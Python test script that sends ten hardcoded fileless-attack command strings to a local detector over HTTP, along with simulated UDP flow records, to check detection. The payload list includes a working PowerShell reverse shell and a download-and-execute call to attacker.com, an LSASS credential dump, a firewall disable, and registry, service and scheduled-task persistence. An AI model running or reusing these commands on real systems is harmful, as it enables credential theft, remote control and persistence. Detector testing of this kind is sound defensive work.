"""
simulate_fileless.py - PowerShell injection & memory attacks
Properly integrated with detector_server.py via UDP/HTTP
"""

import subprocess
import socket
import json
import time
import threading
import requests
from datetime import datetime

API_URL = 'http://localhost:5000/api'
UDP_HOST = '127.0.0.1'
UDP_PORT = 9999

# ============================================================================
# FILELESS ATTACK PAYLOADS
# ============================================================================

FILELESS_PAYLOADS = [
    # 1. Base64 Encoded PowerShell
    {
        'name': 'PowerShell Encoded Payload',
        'command': 'powershell -enc JABhID0gMjAwMzsgd2hpbGUgKCRhIC1sdCAyMDI0KSB7IFdyaXRlLUhvc3QgJGE7ICRhKysgfQ==',
        'description': 'Encoded PowerShell execution (memory attack)',
        'severity': 'CRITICAL',
        'type': 'powershell_encoded'
    },
    
    # 2. PowerShell IEX (Invoke-Expression)
    {
        'name': 'PowerShell IEX Download & Execute',
        'command': 'powershell -NoProfile -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://attacker.com/payload.ps1\')"',
        'description': 'In-memory payload download and execution',
        'severity': 'CRITICAL',
        'type': 'powershell_iex'
    },
    
    # 3. CMD PowerShell Injection
    {
        'name': 'CMD -> PowerShell Injection',
        'command': 'cmd /c powershell -nop -w hidden -c "Get-Process | Stop-Process -Force"',
        'description': 'Kill all processes via PowerShell injection',
        'severity': 'CRITICAL',
        'type': 'cmd_powershell_injection'
    },
    
    # 4. LSASS Memory Dump
    {
        'name': 'LSASS Process Memory Attack',
        'command': 'powershell -Command "Get-Process lsass | Invoke-Command {param($p) rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump $p.Id}"',
        'description': 'Memory dump of credentials',
        'severity': 'CRITICAL',
        'type': 'memory_dump'
    },
    
    # 5. Registry Modification
    {
        'name': 'Registry Persistence',
        'command': 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v malware /t REG_SZ /d "powershell -enc JABhID0gMjAwMzs="',
        'description': 'Registry-based persistence mechanism',
        'severity': 'HIGH',
        'type': 'registry_persistence'
    },
    
    # 6. Service Creation
    {
        'name': 'Malicious Service Creation',
        'command': 'sc create EvilService binPath= "C:\\Windows\\System32\\evil.exe" start= auto',
        'description': 'Create malicious Windows service',
        'severity': 'CRITICAL',
        'type': 'service_creation'
    },
    
    # 7. Scheduled Task
    {
        'name': 'Scheduled Task Injection',
        'command': 'schtasks /create /tn "Windows Update" /tr "C:\\Windows\\System32\\cmd.exe /c powershell -enc JABhID0gMjAwMzs=" /sc minute /mo 5',
        'description': 'Scheduled task for persistent execution',
        'severity': 'HIGH',
        'type': 'scheduled_task'
    },
    
    # 8. Mimikatz-like Credential Extraction
    {
        'name': 'Credential Extraction Tool',
        'command': 'powershell -Command "Get-WmiObject Win32_LogicalMemoryConfiguration | Invoke-Command {param($m) rundll32.exe dpapi.dll MiniDump}"',
        'description': 'Extract credentials from memory',
        'severity': 'CRITICAL',
        'type': 'credential_extraction'
    },
    
    # 9. Firewall Disable
    {
        'name': 'Firewall Disable Attack',
        'command': 'netsh advfirewall set allprofiles state off',
        'description': 'Disable all firewall profiles',
        'severity': 'CRITICAL',
        'type': 'firewall_disable'
    },
    
    # 10. Process Injection (Reverse Shell)
    {
        'name': 'Process Injection Reverse Shell',
        'command': 'powershell -Command "$client = New-Object System.Net.Sockets.TcpClient(\'attacker.com\', 4444); $stream = $client.GetStream(); [byte[]]$buffer = 0..65535|%{0}; while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) { $cmd = ([text.encoding]::UTF8).GetString($buffer, 0, $i); $output = (iex $cmd 2>&1 | Out-String); $stream.Write([byte[]]([char[]]$output), 0, $output.Length) }"',
        'description': 'Reverse shell via process injection',
        'severity': 'CRITICAL',
        'type': 'reverse_shell'
    }
]

# ============================================================================
# DETECTOR INTEGRATION
# ============================================================================

def send_to_detector_http(command, payload_info):
    """Send command to detector via HTTP API"""
    try:
        response = requests.post(
            f'{API_URL}/test-cmd',
            json={
                'command': command,
                'method': 'hybrid',
                'source': 'fileless_simulator',
                'description': payload_info['description']
            },
            timeout=5
        )
        result = response.json()
        print(f"✅ HTTP API Response: {result}")
        return result
    except Exception as e:
        print(f"❌ HTTP Error: {e}")
        return None

def send_network_flow_udp(flow_data):
    """Send network flow via UDP (simulating network traffic)"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(json.dumps(flow_data).encode(), (UDP_HOST, UDP_PORT))
        sock.close()
        print(f"📤 UDP Flow sent: {flow_data['reason']}")
    except Exception as e:
        print(f"❌ UDP Error: {e}")

def simulate_fileless_attack(payload_info):
    """Simulate a single fileless attack"""
    command = payload_info['command']
    name = payload_info['name']
    
    print(f"\n{'='*70}")
    print(f"🔴 SIMULATING: {name}")
    print(f"{'='*70}")
    print(f"Description: {payload_info['description']}")
    print(f"Severity: {payload_info['severity']}")
    print(f"Command: {command[:100]}...")
    print(f"{'='*70}\n")
    
    # 1. Send to detector via HTTP
    print("1️⃣  Sending to detector via HTTP API...")
    result = send_to_detector_http(command, payload_info)

    try:
        requests.post(
            f'{API_URL}/log-event',
            json={
                'level': 'WARNING',
                'component': 'FILELESS_SIM',
                'message': f"Simulated fileless attack: {name} | {payload_info['description']}",
                'source': 'simulator'
            },
            timeout=2
        )
    except Exception:
        pass
    
    # 2. Simulate network activity (if payload includes network operations)
    if 'http' in command.lower() or 'download' in command.lower():
        print("2️⃣  Simulating network traffic (DNS + HTTP)...")
        
        # DNS lookup attempt
        dns_flow = {
            'src_ip': '192.168.1.100',
            'dst_ip': '8.8.8.8',
            'src_port': 12345,
            'dst_port': 53,
            'proto': 17,  # UDP
            'is_anomaly': True,
            'duration': 0.05,
            'pkt_count': 2,
            'byte_count': 100,
            'src2dst_pkts': 1,
            'dst2src_pkts': 1,
            'mean_pkt_size': 50,
            'timestamp': time.time(),
            'reason': f'DNS lookup for malicious domain',
            'severity': 'HIGH',
            'score': 0.65
        }
        send_network_flow_udp(dns_flow)
        time.sleep(0.5)
        
        # HTTP download attempt
        http_flow = {
            'src_ip': '192.168.1.100',
            'dst_ip': '203.0.113.45',  # Simulated attacker IP
            'src_port': 54321,
            'dst_port': 80,
            'proto': 6,  # TCP
            'is_anomaly': True,
            'duration': 2.5,
            'pkt_count': 150,
            'byte_count': 50000,
            'src2dst_pkts': 75,
            'dst2src_pkts': 75,
            'mean_pkt_size': 333,
            'timestamp': time.time(),
            'reason': 'Suspicious payload download',
            'severity': 'CRITICAL',
            'score': 0.85
        }
        send_network_flow_udp(http_flow)
    
    # 3. Log to system
    print("3️⃣  Logging attack event...")
    
    time.sleep(1)

def run_all_fileless_attacks(delay_between=2):
    """Run all fileless attack simulations"""
    print("\n" + "="*70)
    print("🛡️  FILELESS ATTACK SIMULATOR - STARTING")
    print("="*70)
    print(f"Total payloads: {len(FILELESS_PAYLOADS)}")
    print(f"Delay between attacks: {delay_between}s")
    print("="*70 + "\n")
    
    for i, payload in enumerate(FILELESS_PAYLOADS, 1):
        print(f"\n[{i}/{len(FILELESS_PAYLOADS)}] Running payload...\n")
        simulate_fileless_attack(payload)
        
        if i < len(FILELESS_PAYLOADS):
            print(f"⏳ Waiting {delay_between}s before next attack...")
            time.sleep(delay_between)
    
    print("\n" + "="*70)
    print("✅ FILELESS ATTACK SIMULATION COMPLETE")
    print("="*70)
    print("\n📊 CHECK YOUR DASHBOARD:")
    print("   - Network Alerts: http://localhost:5000")
    print("   - CMD History: http://localhost:5000/cmd-history")
    print("   - System Logs: http://localhost:5000/system-logs")
    print("\n")

if __name__ == '__main__':
    print("\n🚀 Fileless Attack Simulator")
    print("Connecting to detector at:", API_URL)
    print("UDP listener at:", f"{UDP_HOST}:{UDP_PORT}\n")
    
    # Check if detector is running
    try:
        response = requests.get(f'{API_URL}/health', timeout=2)
        print(f"✅ Detector is ONLINE")
        print(f"   Status: {response.json()}\n")
    except:
        print("⚠️  WARNING: Detector not responding at", API_URL)
        print("   Make sure to run: python backend/detector_server.py\n")
        input("Press Enter to continue anyway...")
    
    # Run attacks
    run_all_fileless_attacks(delay_between=2)